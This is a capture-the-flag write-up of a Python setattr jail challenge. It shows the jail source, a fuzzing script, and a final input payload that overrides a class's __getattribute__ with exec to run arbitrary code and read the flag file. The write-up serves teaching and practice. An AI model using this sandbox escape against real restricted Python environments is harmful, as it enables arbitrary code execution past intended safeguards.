I initially attempted this challenge because the code was short and it seemed simple, but in the end it took me two days to solve.

```python:jail.py
#/usr/bin/python3
# nowadays, setattr jails seem to be all the hype, and everyone loves builtins, so enjoy a setattr jail with builtins :>
for _ in range(2):
    src = input("Src: ")
    dst = input("Dst: ")
    assert "." not in src and dst.count(".") < 3
    for x in dst.split("."):
        assert x not in ["setattr", "getattr", "print"], "Hey im using those!" 
    a = "." in dst
    b = dst.split(".")
    x = dst
    pdist = __builtins__
    dst = getattr(__builtins__, dst.split(".")[0])
    if a:
        for x in b[1:]:
            pdist = dst
            dst = getattr(dst, x)
    src = getattr(__builtins__, src)
    setattr(pdist, x, src)

print(__builtins__)
```

After examining this code for a while, my first thought was to do something like `getattr = exec` using the first setattr call, however the blacklist prevents me from doing so.

Then, I considered using errors to trigger exec: using `setattr(__builtins__, "AttributeError", exec)` in the first call, then sending something like `print(next(open("flag")))` as dst after that. However, this never worked and the string `'__new_member__'` was being passed as the first argument instead.

I was stuck here for a while until I considered overriding the `__getattr__` or `__setattr__` dunder methods on an object. I tried setting it on a random function: `print.__getattribute__ = exec`. However, this gave the error `AttributeError: 'builtin_function_or_method' object attribute '__getattribute__' is read-only`. 

After a while, I had the idea of fuzzing all the properties I could call setattr on, hence I wrote a quick python script to list all of them.

```python:fuzz.py
for obj in vars(__builtins__).values():
    print('checking:', obj)
    for a in dir(obj):
        try:
            setattr(obj, a, 1)
            print(obj, a)
        except:
            pass
```

This yielded output with surprisingly many results, the first I tested was `help`.

```python
checking: help
Type help() for interactive help, or help(object) for help about object. __call__
Type help() for interactive help, or help(object) for help about object. __delattr__
Type help() for interactive help, or help(object) for help about object. __dir__
Type help() for interactive help, or help(object) for help about object. __doc__
Type help() for interactive help, or help(object) for help about object. __eq__
Type help() for interactive help, or help(object) for help about object. __format__
Type help() for interactive help, or help(object) for help about object. __ge__
Type help() for interactive help, or help(object) for help about object. __getattribute__
Type help() for interactive help, or help(object) for help about object. __gt__
Type help() for interactive help, or help(object) for help about object. __hash__
Type help() for interactive help, or help(object) for help about object. __init__
Type help() for interactive help, or help(object) for help about object. __init_subclass__
Type help() for interactive help, or help(object) for help about object. __le__
Type help() for interactive help, or help(object) for help about object. __lt__
Type help() for interactive help, or help(object) for help about object. __module__
Type help() for interactive help, or help(object) for help about object. __ne__
Type help() for interactive help, or help(object) for help about object. __new__
Type help() for interactive help, or help(object) for help about object. __reduce__
Type help() for interactive help, or help(object) for help about object. __reduce_ex__
Type help() for interactive help, or help(object) for help about object. __repr__
Type help() for interactive help, or help(object) for help about object. __setattr__
Type help() for interactive help, or help(object) for help about object. __sizeof__
Type help() for interactive help, or help(object) for help about object. __str__
Type help() for interactive help, or help(object) for help about object. __subclasshook__
```

I tried running the code:

```python
help.__getattribute__ = exec
getattr(help, "print('aoeu')")
```

Which did not work. Up until now, I had completely forgotten that you need to set `__getattribute__` on the class, not on an instance of it. In retrospect, the following code would work:

```python
help.__class__.__getattribute__ = exec
getattr(help, "print('aoeu')")
```

However, I then tried to use the `__spec__` attribute and eventually remembered that fact.

This was my final payload:

```
Src: exec
Dst: __spec__.__class__.__getattribute__
Src: aoeu
Dst: __spec__.print(getattr(open("flag\x2etxt"), "read")())
```

The flag: `LITCTF{maybe_temporary_flag_for_now_or_not}`

Honestly, I think this was one of the hardest ctf challenges I've solved thus far.